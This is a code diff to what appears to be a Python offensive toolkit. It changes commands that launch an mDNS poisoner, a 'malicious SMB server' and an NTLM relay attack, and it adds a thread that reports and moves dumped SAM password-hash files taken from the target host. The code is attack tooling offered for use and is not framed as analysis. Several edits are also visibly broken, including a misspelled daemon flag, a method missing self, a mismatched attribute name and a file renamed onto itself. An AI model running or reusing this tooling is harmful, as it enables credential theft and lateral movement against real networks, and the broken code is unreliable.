@@ -60,12 +60,14 @@ class SmbServerAttack(CommandSet):
         mdns_thread.daemon = True
         mdns_thread.start()
 
-        smbserver_thread = Thread(target=self.__smbserver.start_malicious_smbserver)
-        smbserver_thread.daemon = True
-        smbserver_thread.start()
+        # smbserver_thread = Thread(target=self.__smbserver.start_malicious_smbserver)
+        # smbserver_thread.daemon = True
+        # smbserver_thread.start()
+        self.__smbserver.start_malicious_smbserver()
 
         # I only wait for a thread because when you finish the process you have to finish
-        smbserver_thread.join()
+        # smbserver_thread.join()
+        # mdns_thread.join()
 
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
         if args.Asynchronous:
@@ -79,6 +81,7 @@ class SmbServerAttack(CommandSet):
         except KeyboardInterrupt:
             self.__attack.terminate()
             self.__attack.join()
+            self.__attack = None
             self._cmd.error_logger.warning("Exiting smb relay attack ...")
 
     def __asynchronous_attack(self):
@@ -133,7 +136,9 @@ class SmbServerAttack(CommandSet):
         )
 
         # output in case of -SS command
-        self.__smbserver = MaliciousSmbServer(self._cmd.LHOST, self._cmd.LPORT)
+        self.__smbserver = MaliciousSmbServer(
+            self._cmd.LHOST, self._cmd.LPORT, args.Asynchronous
+        )
 
         self._cmd.info_logger.debug(
             f"""Starting malicious smb server attack using ip: {self._cmd.LHOST} ipv6:{self._cmd.IPV6}
@@ -173,6 +178,9 @@ class NtlmRelay(CommandSet):
         self.__mdns_poisoner = None
         self.__smb_relay_server = None
         self.__ntlm_relay_process = None
+        self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
+        self.__ouput_sam_dir = os.getcwd()
+
         self.__attacks = {"SMB": SMBAttack}
         self.__clients = {"SMB": SMBRelayClient}
         self.__config = None
@@ -193,6 +201,21 @@ class NtlmRelay(CommandSet):
     def ntlm_relay_attack(self, attack: SmbRelayServer) -> None:
         self.__smb_relay_server = attack
 
+    def __configure_alert_thread(self):
+        self.__check_sam_dumping_status = None
+        self.__check_sam_dumping_status = Thread(self.__is_sam_dumping)
+        self.__check_sam_dumping_status.dameon = True
+        self.__check_sam_dumping_status.start()
+
+    def __is_sam_dumping(self):
+        while True:
+            if os.path.exists(self.__output_sam_dir + self.__output_sam_file):
+                if self.terminal_lock.acquire(blocking=False):
+                    self._cmd.info_logger.info(
+                        f"{self._cmd.RHOST} sam hashes have been dumped"
+                    )
+                    self.terminal_lock.release()
+
     def __try_exit(self, signum, frame):
         self._cmd.info_logger.debug("Block exit ...")
 
@@ -208,10 +231,8 @@ class NtlmRelay(CommandSet):
                 "The specified directory does not exists or you don't have access"
             )
             return
-        elif args.output_sam != ".":
-            move_sam_result = Thread(
-                target=self.__store_sam_results_of_target, args=(args, os.getcwd())
-            )
+        elif args.output_sam != os.getcwd():
+            move_sam_result = Thread(target=self.__store_sam_results_of_target)
             move_sam_result.daemon = True
             move_sam_result.start()
 
@@ -238,6 +259,7 @@ class NtlmRelay(CommandSet):
         except KeyboardInterrupt:
             self.__ntlm_relay_process.terminate()
             self.__ntlm_relay_process.join()
+            self.__ntlm_relay_process = None
             self._cmd.error_logger.warning("Exiting smb relay attack ...")
 
     def __asynchronous_attack(self) -> None:
@@ -259,16 +281,21 @@ class NtlmRelay(CommandSet):
         self.__config.setSMB2Support(True)
         self.__config.interfaceIp = self._cmd.LHOST
 
-    def __store_sam_results_of_target(
-        self, args: argparse.Namespace, actual_dir: str
-    ) -> None:
+    def __store_sam_results_of_target() -> None:
         while True:
-            output_dir = args.output_sam
-            file_name = f"{self._cmd.RHOST}_samhashes.sam"
             try:
-                os.rename(f"{actual_dir}/{file_name}", f"{output_dir}/{file_name}")
-                os.replace(f"{actual_dir}/{file_name}", f"{output_dir}/{file_name}")
-                shutil.move(f"{actual_dir}/{file_name}", f"{output_dir}/{file_name}")
+                os.rename(
+                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
+                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
+                )
+                os.replace(
+                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
+                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
+                )
+                shutil.move(
+                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
+                    f"{self.__output_sam_dir}/{self.__output_sam_file}",
+                )
             except FileNotFoundError:
                 pass
 
@@ -303,7 +330,6 @@ class NtlmRelay(CommandSet):
         "-OS",
         "--output_sam",
         action="store",
-        default=".",
         help="Use a proxy server",
     )
     argParser.add_argument(
@@ -321,10 +347,16 @@ class NtlmRelay(CommandSet):
             args (argparse.Namespace): [Arguments passed to the ntlm relay attack ]
         """
 
+        self.__output_sam_dir = args.output_sam
+        self.__configure_alert_thread()
+
         if args.end_attack:
             self.__ends_ntlm_relay()
+            return
         if self.__ntlm_relay_process != None:
-            self._cmd.error_logger("The attacks is already running in the background ")
+            self._cmd.error_logger.warning(
+                "The attacks is already running in the background "
+            )
             return
 
         self.__mdns_poisoner = MDNS(
@@ -374,7 +406,9 @@ class NtlmRelay(CommandSet):
             try:
                 response = get(url)
                 headers = ["Protocol", "Target", "Username", "Admin", "Port"]
-                print(tabulate(response.json(), headers=headers, tablefmt="sql"))
+                self._cmd.poutput(
+                    tabulate(response.json(), headers=headers, tablefmt="sql")
+                )
             except RequestException:
                 self.error_logger("Error while trying to connect")
         else:
